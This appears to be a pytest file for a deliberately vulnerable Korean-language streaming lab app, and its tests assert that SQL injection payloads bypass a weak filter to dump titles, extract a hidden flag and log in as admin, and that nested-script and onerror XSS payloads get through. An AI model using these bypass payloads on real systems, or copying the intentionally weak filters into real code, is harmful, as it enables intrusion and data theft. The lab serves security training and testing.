from __future__ import annotations

from lab_app_2.app import create_app


def make_client(tmp_path):
    db_path = (tmp_path / "novastream-test.db").as_posix()
    app = create_app(
        {
            "TESTING": True,
            "DATABASE_URL": f"sqlite:///{db_path}",
            "SECRET_KEY": "test-only",
            "TARGET_SET_ID": "novastream-2",
            "DEPLOYMENT_VERSION": "sqlite-v1",
        }
    )
    return app.test_client()


def test_health_endpoint(tmp_path):
    response = make_client(tmp_path).get("/health")
    assert response.status_code == 200
    assert response.get_json() == {
        "status": "ok",
        "target_set_id": "novastream-2",
        "service": "novastream",
        "database_engine": "sqlite",
        "deployment_version": "sqlite-v1",
    }


def test_home_shows_seeded_catalog(tmp_path):
    response = make_client(tmp_path).get("/")
    body = response.get_data(as_text=True)
    assert response.status_code == 200
    assert "우주의 경계" in body
    assert "심해의 기록" in body


def test_sensitive_lab_seed_data_exists_but_is_not_on_home(tmp_path):
    client = make_client(tmp_path)
    database = client.application.extensions["novastream_db"]

    assert database.subscriber_count() == 3
    assert (
        database.lab_flag_value("sqli_extraction")
        == "FLAG{NOVASTREAM_SQLI_EXTRACTION_SUCCESS}"
    )
    assert "FLAG{NOVASTREAM_SQLI_EXTRACTION_SUCCESS}" not in client.get(
        "/"
    ).get_data(as_text=True)


def test_weak_sqli_filter_blocks_literal_space_and_uppercase_keywords(tmp_path):
    client = make_client(tmp_path)

    for payload in ("two words", "UNION", "SELECT"):
        body = client.get("/catalog", query_string={"q": payload}).get_data(
            as_text=True
        )
        assert "요청이 보안 필터에 의해 차단되었습니다" in body


def test_sqli_case_and_tab_bypass_returns_all_titles(tmp_path):
    response = make_client(tmp_path).get(
        "/catalog", query_string={"q": "'or\t1=1--\t"}
    )
    body = response.get_data(as_text=True)
    assert response.status_code == 200
    assert "우주의 경계" in body
    assert "시간의 문" in body


def test_sqli_union_bypass_extracts_hidden_flag(tmp_path):
    payload = (
        "'and\t1=0\tunion\tselect\t"
        "id,flag_value,'lab',2026,'ALL',flag_value,'violet'\t"
        "from\tlab_flags--\t"
    )
    response = make_client(tmp_path).get("/catalog", query_string={"q": payload})
    body = response.get_data(as_text=True)

    assert response.status_code == 200
    assert "FLAG{NOVASTREAM_SQLI_EXTRACTION_SUCCESS}" in body


def test_normal_login_and_account_page(tmp_path):
    client = make_client(tmp_path)
    response = client.post(
        "/login",
        data={"username": "viewer", "password": "viewer123"},
        follow_redirects=True,
    )
    assert response.status_code == 200
    assert "지금 인기 있는 콘텐츠" in response.get_data(as_text=True)

    account = client.get("/account").get_data(as_text=True)
    assert "nova01@example.test" in account
    assert "4821" in account


def test_admin_requires_login_and_accepts_admin_account(tmp_path):
    client = make_client(tmp_path)
    anonymous = client.get("/admin")
    assert anonymous.status_code == 302
    assert anonymous.headers["Location"].endswith("/login")

    response = client.post(
        "/login",
        data={"username": "admin", "password": "admin123"},
        follow_redirects=True,
    )
    assert "운영자 센터" in response.get_data(as_text=True)


def test_login_sqli_case_and_tab_bypass_authenticates_as_admin(tmp_path):
    client = make_client(tmp_path)
    response = client.post(
        "/login",
        data={"username": "'or\t1=1--\t", "password": "wrong"},
        follow_redirects=True,
    )
    body = response.get_data(as_text=True)
    assert "운영자 센터" in body
    assert "ADMIN SESSION · admin" in body


def test_login_weak_filter_blocks_uppercase_select(tmp_path):
    response = make_client(tmp_path).post(
        "/login", data={"username": "SELECT", "password": "x"}
    )
    assert "요청이 보안 필터에 의해 차단되었습니다" in response.get_data(
        as_text=True
    )


def test_reflected_xss_nested_script_bypasses_one_pass_filter(tmp_path):
    payload = "<scscriptript>window.__scanner_marker=1</scscriptript>"
    expected = "<script>window.__scanner_marker=1</script>"
    response = make_client(tmp_path).get("/discover", query_string={"q": payload})
    assert expected in response.get_data(as_text=True)


def test_reflected_xss_event_handler_bypasses_script_filter(tmp_path):
    payload = '<img src=x onerror="window.__event_marker=1">'
    response = make_client(tmp_path).get("/discover", query_string={"q": payload})
    assert payload in response.get_data(as_text=True)


def test_stored_xss_is_escaped_for_viewer_but_raw_for_admin(tmp_path):
    client = make_client(tmp_path)
    payload = "<scscriptript>window.__stored_marker=1</scscriptript>"
    filtered_payload = "<script>window.__stored_marker=1</script>"
    client.post(
        "/titles/1/reviews",
        data={"nickname": "scanner", "body": payload},
    )

    viewer_page = client.get("/titles/1").get_data(as_text=True)
    client.post("/login", data={"username": "admin", "password": "admin123"})
    admin_page = client.get("/admin/reviews").get_data(as_text=True)

    assert filtered_payload not in viewer_page
    assert "&lt;script&gt;" in viewer_page
    assert filtered_payload in admin_page


def test_review_reset_removes_stored_payloads(tmp_path):
    client = make_client(tmp_path)
    client.post(
        "/titles/1/reviews",
        data={"nickname": "scanner", "body": "stored-marker"},
    )
    client.post("/login", data={"username": "admin", "password": "admin123"})
    response = client.post("/admin/reviews/clear", follow_redirects=True)
    assert response.status_code == 200
    assert "stored-marker" not in response.get_data(as_text=True)
